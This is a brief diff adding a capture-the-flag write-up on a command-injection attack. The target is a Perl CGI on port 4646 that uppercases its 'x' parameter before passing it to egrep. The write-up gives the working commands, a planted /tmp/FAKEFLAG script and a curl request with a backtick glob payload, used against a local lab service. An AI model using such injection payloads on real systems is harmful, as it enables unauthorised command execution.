@@ -1,0 +1,10 @@
+we have a perl script listening on port 4646
+the script use egrep with the x query string param cgi
+but before it change all lowercase to uppercase and take the first word
+
+getflag will be GETFLAG
+we can do
+echo "getflag>/tmp/token" > /tmp/FAKEFLAG
+curl localhost:4646?x='`/*/FAKEFLAG`'
+
+so we can inject getflag
